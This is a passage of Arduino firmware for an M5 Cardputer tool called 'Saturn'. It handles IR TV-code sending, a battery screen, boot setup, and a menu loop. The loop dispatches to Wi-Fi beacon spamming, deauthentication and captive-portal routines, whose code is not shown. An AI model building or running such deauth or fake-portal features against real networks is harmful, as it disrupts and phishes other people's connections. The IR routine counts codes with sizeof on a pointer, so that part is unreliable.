    currentProc = 5;
  }
}

void sendIrProntoCodes(uint16_t *codes[], int sizes[], String name) {
  int size_all_codes = sizeof(codes) / sizeof(uint16_t*);

  Serial.println("\nSize of all codes: " + String(size_all_codes));
  bool endingEarly = false;

  for (int i = 0; i < size_all_codes; i++) {
    int size = sizes[i];
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setTextSize(LARGE_TEXT);
    DISPLAY.drawString(name, DISPLAY_CENTER_X, 50);
    DISPLAY.setTextSize(MEDIUM_TEXT);
    DISPLAY.drawString("<- p/ voltar", DISPLAY_CENTER_X, 80);

    irsend.sendPronto(codes[i], size);

    Serial.println("\nSize of IR code: " + String(size));
    Serial.println("Sent IR codes:");
    for (int j = 0; j < size; j++) {
      Serial.print(codes[i][j]);
      Serial.print(", ");
    }
    delay(40);
  }
  digitalWrite(IR_SEND_PIN, HIGH);
  delay(1000);
  if (checkSelectPress()){
    Serial.println("STOPPING PREMATURELY");
    endingEarly = true;
    currentProc = 5;
  }
}

void settingsMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(settingsMenu, sizeof(settingsMenu) / sizeof(Menu));
  delay(500);
}

void settingsMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % (sizeof(settingsMenu) / sizeof(Menu));
    drawMenu(settingsMenu, sizeof(settingsMenu) / sizeof(Menu));
    delay(250);
  }
  if (checkSelectPress()) {
    if (settingsMenu[cursor].command == 19) {
      isSwitching = true;
      currentProc = 19;
    } else if (settingsMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 1;
    }
  }
}

// -=-=-= BATTERY INFO =-=-=-

uint8_t oldBattery = 0;

void batteryDrawMenu(uint8_t battery) {
  // Battery bar color based on percentage
  uint16_t batteryBarColor = MAIN_COLOR;
  if(battery < 20) {
    batteryBarColor = RED;
  } else if(battery < 60) {
    batteryBarColor = ORANGE;
  } else {
    batteryBarColor = MAIN_COLOR;
  }
  // Draw battery bar
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.drawRect(10, 10, 220, 100, batteryBarColor);
  DISPLAY.fillRect(10, 10, (220 * battery / 100), 100, batteryBarColor);

  // Battery percentage
  DISPLAY.setTextColor(BLACK);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.setCursor(90, 60, 1);
  DISPLAY.print(battery);
  DISPLAY.println("%");

  // Exit text
  DISPLAY.setCursor(10, 120, 1);
  DISPLAY.setTextColor(WHITE);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.println(TXT_EXIT);
  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
}

int getBatteryVoltage() {
    return M5.Power.getBatteryLevel();
  }

void batterySetup() {
  rstOverride = false;
  pinMode(VBAT_PIN, INPUT);
  uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
  batteryDrawMenu(battery);
  delay(500); // Prevent switching after menu loads up
  /*
    Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
    It only shows decent values when disconnected from charger, due to HW limitations.
    Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
  */
}

void batteryLoop() {
  // Read 30 battery values to calculate the average (avoiding unprecise and close values)
  uint16_t batteryValues = 0;
  for(uint8_t i = 0; i < 30; i++) { // 30 iterations X 100ms = 3 seconds for each refresh
    delay(100);
    batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) { // If any key is pressed
      rstOverride = false;
      isSwitching = true;
      currentProc = 1;
      break;
    }
  }

  if(!isSwitching) { // If is not switching, calculate battery average
    uint8_t battery = batteryValues / 30; // Iteration times
    Serial.printf("Battery Level: %d\n", battery);
    if(battery != oldBattery) { // Only draw a new screen if value is different
      oldBattery = battery;
      batteryDrawMenu(battery);
    }
  }
}

// -=-=-= SETUP AND LOOP =-=-=-

void setup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg);
  M5Cardputer.Display.setRotation(1);
  DISPLAY.setTextDatum(middle_center);

  #if defined(IR_SEND_PIN)
    pinMode(IR_SEND_PIN, OUTPUT);
    digitalWrite(IR_SEND_PIN, HIGH);
  #endif
  
  // Boot screen
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextColor(MAIN_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString("Saturn", DISPLAY_CENTER_X, 45);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.drawString("Cardputer", DISPLAY_CENTER_X, 75);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.drawString(SATURN_VERSION, DISPLAY_CENTER_X, 95);

  Serial.println("\nSaturn " + String(SATURN_VERSION) + " started");
  Serial.println("Hello, world!");
  Serial.println("IR Send Pin: " + String(IR_SEND_PIN));
  #if defined(LANGUAGE_EN_US)
    Serial.println("Language: English (US)");
  #else
    Serial.println("Language: Portuguese (BR)");
  #endif

  // Beep on boot, similar to Mikrotik boot sound
  #if defined(SOUND)
    delay(500);
    M5Cardputer.Speaker.tone(5050, 90);
    delay(220);
    M5Cardputer.Speaker.tone(5050, 90);
    delay(500);
  #else
    delay(1400);  // Silence Mode
  #endif
}

// Proccesses
// 1 - Main Menu
// 2 - QR Codes
// 3 - Settings
// 4 - IR Devices
// 5 - IR TV
// 21 - Wi-Fi Beacon

void loop() {
  // Background processes
  switcherButtonProc();
  checkMenuPress();

  if (isSwitching) {
    isSwitching = false;
    switch (currentProc) {
      case 1:
        mainMenuSetup();
        break;
      case 2:
        qrMenuSetup();
        break;
      case 3:
        settingsMenuSetup();
        break;
      case 4:
        irDevicesMenuSetup();
        break;
      case 5:
        irTvMenuSetup();
        break;
      case 19:
        batterySetup();
        break;
      case 20:
        wifiMenuSetup();
        break;
      case 21:
        wifiBeaconSetup();
        break;
      case 22:
        wifiScanSetup();
        break;
      case 23:
        wifiAttackMenuSetup();
        break;
      case 24:
        wifiScanResultSetup();
        break;
      case 25:
        portalSetup();
        break;
      case 26:
        deauthSetup();
        break;
    }
  }

  switch (currentProc) {
    case 1:
      mainMenuLoop();
      break;
    case 2:
      qrMenuLoop();
      break;
    case 3:
      settingsMenuLoop();
      break;
    case 4:
      irDevicesMenuLoop();
      break;
    case 5:
      irTvMenuLoop();
      break;
    case 19:
      batteryLoop();
      break;
    case 20:
      wifiMenuLoop();
      break;
    case 21:
      wifiBeaconLoop();
      break;
    case 22:
      wifiScanLoop();
      break;
    case 23:
      wifiAttackMenuLoop();
      break;
    case 24:
      wifiScanResultLoop();
      break;
    case 25:
      portalLoop();
      break;
    case 26:
      deauthLoop();
      break;
  }
}